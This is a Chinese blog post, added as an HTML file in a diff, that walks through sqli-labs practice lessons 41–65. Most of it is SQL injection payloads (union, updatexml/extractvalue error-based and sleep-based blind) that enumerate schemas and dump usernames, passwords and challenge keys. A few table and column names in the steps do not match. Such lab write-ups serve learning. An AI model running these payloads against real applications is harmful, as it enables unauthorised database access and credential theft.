@@ -1,0 +1,467 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-labs 41-65 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqli-labs 41-65 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Less-41
+经检测为数字型注入因为
+?id=1 and 1=1 回显正确
+?id=1 and 1=2 回显错误
+
+查询相关数据
+?id=-1 union select 1,2,group_concat(schema_name) from..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-labs 41-65
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-04-22
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="less-41">Less-41</h1>
+<p>经检测为数字型注入因为</p>
+<pre><code>?id=1 and 1=1 回显正确
+?id=1 and 1=2 回显错误
+</code></pre>
+<p>查询相关数据</p>
+<pre><code>?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
+?id=-1 union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
+</code></pre>
+<h1 id="less-42堆叠或者直接报错">Less-42堆叠或者直接报错</h1>
+<p>[']<br>
+Update 更新数据后，经过 mysql_real_escape_string()处理后的数据，存入到数据库当中后不会发生变化。在 select 调用的时候才能发挥作用。所以不用考虑在更新密码处进行注入，这关和二次注入的思路是不一样的。<br>
+本关从 login.php 源代码中分析可知：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619060848661.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619060855446.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619060860870.png" alt="" loading="lazy"><br>
+Password 变量在 post 过程中，没有通过 mysql_real_escape_string()函数的处理<br>
+的时候密码选项我们可以进行 attack。<br>
+登录用户名随意</p>
+<pre><code>地址写成：
+http://**************/sqli-labs-master/Less-42/login.php
+</code></pre>
+<p>然后查询数据</p>
+<pre><code>?login_user=admin&amp;login_password=' and updatexml(1,concat(0x7e,database(),0x7e),1)#
+?login_user=admin&amp;login_password=' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)#
+?login_user=admin&amp;login_password=' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+?login_user=admin&amp;login_password=' and updatexml(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,username,password)) from users),0x7e),1)#
+</code></pre>
+<h1 id="less-43">Less-43</h1>
+<p>[')]</p>
+<pre><code>地址写成：
+http://**************/sqli-labs-master/Less-43/login.php
+</code></pre>
+<p>然后查询数据</p>
+<pre><code>?login_user=admin&amp;login_password=') and updatexml(1,concat(0x7e,database(),0x7e),1)#
+?login_user=admin&amp;login_password=') and updatexml(1,concat(0x7e,version(),0x7e),1)#
+?login_user=admin&amp;login_password=') and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)#
+?login_user=admin&amp;login_password=') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+?login_user=admin&amp;login_password=') and updatexml(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,username,password)) from users),0x7e),1)#
+</code></pre>
+<h1 id="less-44">Less-44</h1>
+<p>[']</p>
+<pre><code>地址写成：
+http://**************/sqli-labs-master/Less-44/login.php
+</code></pre>
+<p>然后查询数据</p>
+<pre><code>login_user=admin&amp;login_password=' union select 1,group_concat(schema_name),3 from information_schema.schemata#
+login_user=admin&amp;login_password=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+login_user=admin&amp;login_password=' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'#
+login_user=admin&amp;login_password=' union select 1,group_concat(concat_ws(&quot;:&quot;,username,password)),3 from users#
+</code></pre>
+<h1 id="less-45">Less-45</h1>
+<p>[')]</p>
+<pre><code>地址写成：
+http://**************/sqli-labs-master/Less-45/login.php
+</code></pre>
+<p>然后查询数据</p>
+<pre><code>login_user=admin&amp;login_password=') union select 1,group_concat(schema_name),3 from information_schema.schemata#
+login_user=admin&amp;login_password=') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+login_user=admin&amp;login_password=') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'#
+login_user=admin&amp;login_password=') union select 1,group_concat(concat_ws(&quot;:&quot;,username,password)),3 from users#
+</code></pre>
+<h1 id="less-46">Less-46</h1>
+<pre><code>?sort=1 and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))--+
+?sort=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+
+?sort=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))--+
+?sort=1 and extractvalue(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,username,password)) from users),0x7e))--+
+</code></pre>
+<h1 id="less-47">Less-47</h1>
+<p>[']</p>
+<pre><code>?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,username,password)) from users),0x7e))--+
+</code></pre>
+<h1 id="less-48">Less-48</h1>
+<pre><code>?sort=1 and if(length(database())=8,1,sleep(2))--+
+?sort=1 and if(substr(database(),1,1)='s',1,sleep(2))--+
+?sort=1 and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+
+?sort=1 and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(2))--+
+?sort=1 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d',1,sleep(2))--+
+</code></pre>
+<h1 id="less-49">Less-49</h1>
+<p>[']</p>
+<pre><code>?sort=1' and if(length(database())=8,1,sleep(2))--+
+?sort=1' and if(substr(database(),1,1)='s',1,sleep(2))--+
+?sort=1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+
+?sort=1' and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(2))--+
+?sort=1' and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d',1,sleep(2))--+
+</code></pre>
+<h1 id="less-50">Less-50</h1>
+<pre><code>?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)#
+?sort=1 and updatexml(1,concat(0x7e,version(),0x7e),1)#
+?sort=1 and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)#
+?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+?sort=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,username,password)) from users),0x7e),1)#
+</code></pre>
+<h1 id="less-51">Less-51</h1>
+<p>[']</p>
+<pre><code>?sort=1' and extractvalue(1,concat(0x7e,database()))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(concat_ws(&quot;:&quot;,username,password)) from users)))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')))--+
+?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
+</code></pre>
+<h1 id="less-52">Less-52</h1>
+<pre><code>?sort=1 and if(length(database())=8,1,sleep(2))--+
+?sort=1 and if(substr(database(),1,1)='s',1,sleep(2))--+
+?sort=1 and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+
+?sort=1 and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(2))--+
+?sort=1 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d',1,sleep(2))--+
+</code></pre>
+<h1 id="less-53">Less-53</h1>
+<p>[']</p>
+<pre><code>?sort=1' and if(length(database())=8,1,sleep(2))--+
+?sort=1' and if(substr(database(),1,1)='s',1,sleep(2))--+
+?sort=1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+
+?sort=1' and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(2))--+
+?sort=1' and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d',1,sleep(2))--+
+</code></pre>
+<h1 id="less-54">Less-54</h1>
+<p>测试显示位</p>
+<pre><code>?id=1' order by 3 --+ // True
+?id=1' order by 4 --+ // false
+</code></pre>
+<p>获取库名</p>
+<pre><code>?id=0' union select 1,2,database()--+ // True challenges
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+//sr2765z6ma
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='sr2765z6ma'--+//secret_FQHN
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=0' union select 1,2,group_concat(secret_FQHN) from sr2765z6ma--+//OtS4hf7GK9E5r36zPaaxYT2S
+</code></pre>
+<h1 id="less-55">Less-55</h1>
+<p>测试显示位</p>
+<pre><code>?id=1) order by 3 --+ // True
+?id=1) order by 4 --+ // false
+</code></pre>
+<p>获取库名</p>
+<pre><code>?id=0) union select 1,2,database()--+ // True challenges
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+//ngezf8m9e8
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=0) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='sr2765z6ma'--+//secret_C41J
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=0) union select 1,2,group_concat(secret_FQHN) from sr2765z6ma--+//eIBeUMWtx2vimfrFC6I3tghF
+</code></pre>
+<p>Less55与54不同在于id参数闭合符号为 ( )<br>
+database：challenges<br>
+table_name:ngezf8m9e8<br>
+column_name:secret_C41J<br>
+key:eIBeUMWtx2vimfrFC6I3tghF</p>
+<h1 id="less-56">Less-56</h1>
+<pre><code>?id=1') order by 3 --+ // True
+?id=1) order by 4 --+ // false
+</code></pre>
+<p>获取库名</p>
+<pre><code>?id=0') union select 1,2,database()--+ // True challenges
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=0') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+//0l7axruw24
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=0') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='0l7axruw24'--+//secret_Q0T4
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=0') union select 1,2,group_concat(secret_Q0T4) from 0l7axruw24--+//nfrdtsnM0jL8iwqR6iAGnnc2
+</code></pre>
+<p>56闭合符号为('')</p>
+<h1 id="less-57">Less-57</h1>
+<pre><code>?id=1&quot; order by 3 --+ // True
+?id=1&quot; order by 4 --+ // false
+</code></pre>
+<p>获取库名</p>
+<pre><code>?id=0&quot; union select 1,2,database()--+ // True challenges
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=0&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+//udekem1a8m
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=0&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name='udekem1a8m'--+//secret_DR1P
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=0&quot; union select 1,2,group_concat(secret_DR1P) from udekem1a8m--+//jvwbKcrsVpvGG7r72crHote5
+</code></pre>
+<p>57闭合符号为&quot;&quot;</p>
+<h1 id="less-58">Less-58</h1>
+<p>获取数据库</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+//oilntvhrkv
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='oilntvhrkv'),0x7e),1)--+//secret_NJQI
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_NJQI) from oilntvhrkv),0x7e),1)--+
+edX6kT5tSgbCrTu0XXNmb8oU
+</code></pre>
+<p>#Less-59<br>
+获取数据库</p>
+<pre><code>?id=1 and updatexml(1,concat(0x7e,(database()),0x7e),1)
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) //8nol5dwme6
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='8nol5dwme6'),0x7e),1)//secret_UW3B
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_UW3B) from 8nol5dwme6),0x7e),1)//
+CKhOaaZqhX9HudYu2rNSRfh9
+</code></pre>
+<h1 id="less-60">Less-60</h1>
+<p>获取数据库</p>
+<pre><code>?id=1&quot;) and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+//voywesi82a
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='voywesi82a'),0x7e),1)--+//secret_0TB
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_0TBA) from voywesi82a),0x7e),1)--+
+WP1I1arba3hhwA0fJlk7PCO8
+</code></pre>
+<h1 id="less-61">Less-61</h1>
+<p>获取数据库</p>
+<pre><code>?id=1')) and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
+</code></pre>
+<p>获取表名</p>
+<pre><code>?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+//34tjqs4pst
+</code></pre>
+<p>获取列名</p>
+<pre><code>?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='34tjqs4pst'),0x7e),1)--+//secret_Y4WV
+</code></pre>
+<p>获取key</p>
+<pre><code>?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_Y4WV) from 34tjqs4pst),0x7e),1)--+
+b9156yzOgwluB2xKyjftrySK
+</code></pre>
+<h1 id="less-62">Less-62</h1>
+<p>经检测</p>
+<pre><code>?id=1') and ('1')=('2 回显不正确
+?id=1') and ('1')=(' 回显正确
+</code></pre>
+<p>说明是[')]类型<br>
+而且无报错所以用延时注入</p>
+<pre><code>?id=1') and If(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),1,1)='3',1,sleep(5))-- +//y6q9japcwx
+?id=1') and if(substr((select group_concat(column_name) from information_schema.columns where table_name='34tjqs4pst'),1,1)='i',1,sleep(3))--+//secret_YQFI
+?id=1') and if(substr((select group_concat(secret_YQFI) from y6q9japcwx limit 0,1),1,1)='S',1,sleep(3))--+//SXpv3ffqjFg940EI999FbPlT
+</code></pre>
+<h1 id="less-63">Less-63</h1>
+<p>类型为[']<br>
+其余同Less-62</p>
+<h1 id="less-64">Less-64</h1>
+<p>类型为[))]<br>
+其余同Less-62</p>
+<h1 id="less-65">Less-65</h1>
+<p>类型为[&quot;)]<br>
+其余同Less-62</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#less-41">Less-41</a></li>
+<li><a href="#less-42%E5%A0%86%E5%8F%A0%E6%88%96%E8%80%85%E7%9B%B4%E6%8E%A5%E6%8A%A5%E9%94%99">Less-42堆叠或者直接报错</a></li>
+<li><a href="#less-43">Less-43</a></li>
+<li><a href="#less-44">Less-44</a></li>
+<li><a href="#less-45">Less-45</a></li>
+<li><a href="#less-46">Less-46</a></li>
+<li><a href="#less-47">Less-47</a></li>
+<li><a href="#less-48">Less-48</a></li>
+<li><a href="#less-49">Less-49</a></li>
+<li><a href="#less-50">Less-50</a></li>
+<li><a href="#less-51">Less-51</a></li>
+<li><a href="#less-52">Less-52</a></li>
+<li><a href="#less-53">Less-53</a></li>
+<li><a href="#less-54">Less-54</a></li>
+<li><a href="#less-55">Less-55</a></li>
+<li><a href="#less-56">Less-56</a></li>
+<li><a href="#less-57">Less-57</a></li>
+<li><a href="#less-58">Less-58</a></li>
+<li><a href="#less-60">Less-60</a></li>
+<li><a href="#less-61">Less-61</a></li>
+<li><a href="#less-62">Less-62</a></li>
+<li><a href="#less-63">Less-63</a></li>
+<li><a href="#less-64">Less-64</a></li>
+<li><a href="#less-65">Less-65</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/mysqli-labs-23-65/">
+              <h3 class="post-title">
+                sqli-labs 23-40
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
